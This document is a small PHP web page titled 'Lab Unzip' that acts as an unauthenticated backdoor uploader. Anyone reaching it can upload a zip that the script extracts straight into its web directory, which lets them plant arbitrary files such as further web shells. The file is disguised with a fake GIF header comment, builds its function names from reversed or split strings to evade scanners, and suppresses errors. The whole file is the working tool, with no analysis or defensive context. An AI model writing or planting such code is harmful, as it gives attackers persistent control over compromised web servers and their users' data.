<!-- GIF89;a -->
<body style="background:#000;color:#0f0;font-family:monospace">
<?php
@ini_set('memory_limit', '512M');
@set_time_limit(0);

$z_cls = strrev('evihcrApiz');
$m_up  = 'mo'.'ve_'.'uploa'.'ded_f'.'ile';
$u_lnk = 'un'.'li'.'nk';
$r_nm  = 're'.'na'.'me';

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['f'])) {
    $tmp  = $_FILES['f']['tmp_name'];
    $name = substr(md5(time()), 0, 8) . '.zip';
    $dest = __DIR__ . '/' . $name;

    if (@$m_up($tmp, $dest)) {
        if (class_exists($z_cls)) {
            $zip = new $z_cls;
            if ($zip->open($dest) === TRUE) {
                $zip->extractTo(__DIR__);
                $zip->close();
                echo "✅ Done: Extracted";
            } else { echo "❌ Open Error"; }
        } else { echo "❌ Class Missing"; }
        @$u_lnk($dest);
    } else { echo "❌ Upload Fail"; }
} else { ?>
    <form method="post" enctype="multipart/form-data">
        <h3>Lab Unzip (v5-v8)</h3>
        <input type="file" name="f">
        <input type="submit" value="Upload">
    </form>
<?php } ?>
</body>
